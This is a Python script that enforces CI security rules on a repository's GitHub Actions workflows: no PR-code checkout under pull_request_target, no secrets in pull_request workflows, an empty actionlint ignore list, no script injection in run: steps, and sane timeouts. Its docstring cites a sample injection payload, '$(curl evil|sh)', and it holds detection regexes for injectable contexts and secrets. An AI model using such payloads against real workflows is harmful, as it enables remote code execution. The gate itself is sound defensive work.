#!/usr/bin/env python3
"""Enforce the repository's CI trust-boundary invariants as code.

The auto-run-CI-on-outside-PRs safety documented in AGENTS.md rests on a few invariants that
`actionlint` cannot check. This gate encodes them so a future edit cannot quietly turn an
auto-run into arbitrary code execution with a privileged token, or leak a secret to PR code:

  RULE A - A `pull_request_target` workflow (which runs in the trusted base context with a
           write-capable token and secrets) must NOT check out or run PR-authored code. We
           enforce the strict, statically-checkable form: no `actions/checkout` in such a
           workflow. (Near-miss history: PR #24's pages deploy nearly ran repo code with an
           OIDC token; the fix was to keep PR code out of the privileged job.)

  RULE B - A workflow that runs PR-authored code (any `pull_request` trigger) must NOT
           reference `secrets.*`. Privileged, main-only work belongs in a separate
           `push`/`pull_request_target` workflow (AGENTS.md: "split it"). This keeps the
           gates that execute PR code read-only and secret-free on same-repo PRs, where the
           fork sandbox does not engage.

  RULE C - `.github/actionlint.yaml` must not carry a non-empty `ignore` list. History
           (PR #38 -> #44/#45): an invalid `on:` event silently disabled a required workflow;
           actionlint caught it, but a hand-written ignore claiming the event was
           "valid and load-bearing" silenced the one tool that was right.

  RULE D - No `run:` shell step may interpolate ATTACKER-CONTROLLABLE context (a PR/issue
           title or body, a comment/review body, a commit message, `github.head_ref`, a PR
           head ref/label) directly with `${{ ... }}`. That is GitHub Actions script
           injection: the text is spliced into the shell before it runs, so a PR titled
           `$(curl evil|sh)` executes. The safe pattern (which the multi-duck-review gate
           uses) is to bind the value to an `env:` var and reference it as "$VAR" in the
           script, so the runner passes it as data, never as code. This also blunts
           prompt-injection reaching any LLM step downstream of the shell.

  RULE E - A job whose checkout requests FULL history (`fetch-depth: 0`) must not declare a
           `timeout-minutes` a full clone of this repository can plausibly exceed. History
           (issue #951): the `changes` and `version-lane` jobs were cancelled at 5m1s-5m4s
           under runner contention while their full clone was still running - and because the
           aggregate `plugin-tests` gate is deliberately fail-CLOSED, a cancelled `changes`
           reddened a REQUIRED check that said nothing about the PR. A timeout that loses a
           race with a checkout catches no hung job; it only manufactures flaky reds. A job
           with no `timeout-minutes` at all is not flagged (GitHub's 6-hour default cannot
           lose that race), and neither is a non-numeric budget, which cannot be evaluated
           statically.

Exit non-zero on any violation. Standard library plus PyYAML only.
"""
import glob
import os
import re
import sys

import yaml

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
WORKFLOWS_DIR = os.path.join(ROOT, ".github", "workflows")
ACTIONLINT_CONFIGS = (
    os.path.join(ROOT, ".github", "actionlint.yaml"),
    os.path.join(ROOT, ".github", "actionlint.yml"),
)


def _triggers(doc):
    """Return the set of trigger names for a parsed workflow. PyYAML uses YAML 1.1, so the
    bare `on:` key is parsed as the boolean True, not the string 'on' - handle both."""
    on = doc.get("on")
    if on is None:
        on = doc.get(True)
    if on is None:
        return set()
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return set(on)
    if isinstance(on, dict):
        return set(on.keys())
    return set()


def _rel(path):
    """Repo-relative path for messages, tolerant of a temp file on a different Windows drive
    than the repo (os.path.relpath raises ValueError across drives)."""
    try:
        return os.path.relpath(path, ROOT)
    except ValueError:
        return path


def _strip_full_line_comments(text):
    """Drop YAML full-line comments (a line whose first non-space char is '#') so a mention of
    `uses: actions/checkout` or `secrets.X` inside a comment is not scanned as real config."""
    return "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#"))


# Ways a privileged (pull_request_target) workflow could run PR-authored code. `uses: actions/checkout`
# (optionally quoted) is the common one; `gh pr checkout` is the other high-precision signal. We do
# NOT flag a bare `github.event.pull_request.head.sha` reference: reading the head SHA to POST a commit
# status (as require-owner-approval.yml does) is safe metadata use, not running PR code. Transitive PR
# checkout inside a reusable `workflow_call` callee is a known limitation - review reachable callees.
_CHECKOUT_RE = re.compile(r"""uses:\s*["']?actions/checkout""")
_PR_CODE_RES = (
    (re.compile(r"gh\s+pr\s+checkout"), "gh pr checkout"),
)
# Secret references a pull_request (PR-code) workflow must not carry: dotted, bracket, or `inherit`.
_SECRETS_RES = (
    (re.compile(r"\bsecrets\."), "secrets.*"),
    (re.compile(r"\bsecrets\s*\["), "secrets['...']"),
    (re.compile(r"\bsecrets\s*:\s*inherit"), "secrets: inherit"),
)
# RULE D: attacker-controllable expression contexts that must never be spliced into a run: shell.
# Matches a PR/issue title or body, a comment/review/discussion body, a commit message, the page
# name, a commit author name/email, github.head_ref, a PR head ref/label, and toJSON() of any
# github.event object (serializing it into the shell is equally injectable). SHAs, numbers, and
# logins are intentionally NOT here - they are constrained and are the safe metadata values run:
# steps legitimately use. Bracket/index notation (`['body']`, `["pull_request"]`, `[0]`) is
# normalized to dotted form first, so `github.event.pull_request['body']` cannot evade the guard.
_EXPR_RE = re.compile(r"\$\{\{(.*?)\}\}", re.S)
_BRACKET_INDEX_RE = re.compile(r"\[\s*['\"]?([\w-]+)['\"]?\s*\]")
_INJECTABLE_CTX_RE = re.compile(
    r"github\.head_ref"
    r"|github\.event\.pull_request\.head\.(?:ref|label)"
    r"|github\.event\.[\w.]*\.(?:body|title|message|page_name)\b"
    r"|github\.event\.[\w.]*\.author\.(?:name|email)\b"
    r"|toJSON\(\s*github\.event\b",
    re.IGNORECASE,
)


def _normalize_expr(expr):
    """Rewrite bracket/index property access to dotted form so both notations are checked alike:
    `github['event']['pull_request']['body']` -> `github.event.pull_request.body`."""
    prev = None
    out = expr
    # Repeat until stable so chained `[...][...]` segments all collapse.
    while out != prev:
        prev = out
        out = _BRACKET_INDEX_RE.sub(r".\1", out)
    return out


def _iter_run_scripts(doc):
    """Yield (job_id, step_index, run_text) for every step that carries a string `run:` script."""
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list):
            continue
        for idx, step in enumerate(steps):
            if isinstance(step, dict) and isinstance(step.get("run"), str):
                yield job_id, idx, step["run"]


# RULE E: the smallest timeout a job may declare when its checkout clones the full history.
# Observed spurious cancellations sat at 5m under runner contention, so 5 is not a budget - it is
# a coin flip. Ten minutes leaves the clone room while still catching a genuinely hung job.
FULL_HISTORY_MIN_TIMEOUT = 10
_CHECKOUT_STEP_RE = re.compile(r"^actions/checkout(?:@|$)")


def _is_full_history_checkout(step):
    """True when a step is an actions/checkout that asks for the whole history."""
    if not isinstance(step, dict):
        return False
    uses = step.get("uses")
    if not isinstance(uses, str) or not _CHECKOUT_STEP_RE.match(uses.strip().strip("\"'")):
        return False
    with_ = step.get("with")
    if not isinstance(with_, dict):
        return False
    # YAML gives an int for `fetch-depth: 0` and a str for `fetch-depth: "0"`; both mean full.
    return str(with_.get("fetch-depth", "")).strip() == "0"


def check_job_budgets(doc, rel):
    """RULE E: a full-history checkout must not race the job's own timeout."""
    violations = []
    jobs = doc.get("jobs")
    if not isinstance(jobs, dict):
        return violations
    for job_id, job in jobs.items():
        if not isinstance(job, dict):
            continue
        steps = job.get("steps")
        if not isinstance(steps, list) or not any(_is_full_history_checkout(s) for s in steps):
            continue
        budget = job.get("timeout-minutes")
        if isinstance(budget, bool) or not isinstance(budget, (int, float)):
            continue  # unset (6-hour default) or an expression we cannot evaluate statically
        if budget < FULL_HISTORY_MIN_TIMEOUT:
            violations.append(
                rel + ": RULE E - job '" + str(job_id) + "' checks out with fetch-depth: 0 but "
                "budgets only " + str(budget) + " minute(s). A full clone of this repository can "
                "exceed that under runner contention, and the job is then CANCELLED - a red that "
                "says nothing about the change (issue #951). Budget at least "
                + str(FULL_HISTORY_MIN_TIMEOUT) + " minutes, or make the checkout cheaper.")
    return violations


def check_workflow(path):
    """Return a list of violation strings for one workflow file."""
    rel = _rel(path)
    violations = []
    with open(path, "r", encoding="utf-8") as fh:
        raw = fh.read()
    try:
        doc = yaml.safe_load(raw) or {}
    except yaml.YAMLError as exc:
        return [rel + ": could not parse YAML (" + str(exc) + ")"]
    triggers = _triggers(doc)
    text = _strip_full_line_comments(raw)

    # RULE A: a pull_request_target workflow must not check out or otherwise materialize PR code.
    if "pull_request_target" in triggers:
        if _CHECKOUT_RE.search(text):
            violations.append(
                rel + ": RULE A - a pull_request_target workflow must not use actions/checkout "
                "(it would run PR-authored code with a privileged token). Move PR-code steps to a "
                "separate pull_request job.")
        for rx, label in _PR_CODE_RES:
            if rx.search(text):
                violations.append(
                    rel + ": RULE A - a pull_request_target workflow must not materialize PR code via "
                    + label + " (it would run PR-authored code with a privileged token).")

    # RULE B: a workflow that runs PR code (pull_request) must not reference secrets in any form.
    if "pull_request" in triggers:
        for rx, label in _SECRETS_RES:
            if rx.search(text):
                violations.append(
                    rel + ": RULE B - a pull_request workflow must not reference " + label
                    + " (it executes PR-authored code). Put privileged, secret-using steps in a "
                    "separate push or pull_request_target workflow.")

    # RULE D: no run: shell step may splice attacker-controllable context in with ${{ ... }}.
    for job_id, idx, run_text in _iter_run_scripts(doc):
        for m in _EXPR_RE.finditer(run_text):
            hit = _INJECTABLE_CTX_RE.search(_normalize_expr(m.group(1)))
            if hit:
                violations.append(
                    rel + ": RULE D - job '" + str(job_id) + "' step " + str(idx)
                    + " interpolates attacker-controllable context `" + hit.group(0)
                    + "` straight into a run: shell (script injection). Bind it to an env: var and "
                    'reference it as "$VAR" in the script so the runner passes it as data, not code.')

    # RULE E: a full-history checkout must not lose a race with the job's own timeout.
    violations.extend(check_job_budgets(doc, rel))

    return violations


def check_actionlint_config():
    """Return a list of violations for a non-empty actionlint ignore list (either config filename)."""
    for config in ACTIONLINT_CONFIGS:
        if not os.path.exists(config):
            continue
        rel = _rel(config)
        with open(config, "r", encoding="utf-8") as fh:
            try:
                doc = yaml.safe_load(fh) or {}
            except yaml.YAMLError as exc:
                return [rel + ": could not parse YAML (" + str(exc) + ")"]
        ignores = []
        top = doc.get("ignore")
        if isinstance(top, list):
            ignores.extend(top)
        paths = doc.get("paths")
        if isinstance(paths, dict):
            for spec in paths.values():
                if isinstance(spec, dict) and isinstance(spec.get("ignore"), list):
                    ignores.extend(spec["ignore"])
        if ignores:
            return [rel + ": RULE C - the actionlint ignore list must be empty. "
                    "A suppression silences the tool that catches invalid workflows; fix the "
                    "workflow instead of ignoring the warning. Current ignores: " + repr(ignores)]
    return []


def main():
    violations = []
    for path in sorted(glob.glob(os.path.join(WORKFLOWS_DIR, "*.yml"))
                       + glob.glob(os.path.join(WORKFLOWS_DIR, "*.yaml"))):
        violations.extend(check_workflow(path))
    violations.extend(check_actionlint_config())
    if violations:
        sys.stderr.write("check_workflow_policy FAILED:\n")
        for v in violations:
            sys.stderr.write("  - " + v + "\n")
        return 1
    print("check_workflow_policy OK (CI trust-boundary invariants hold).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
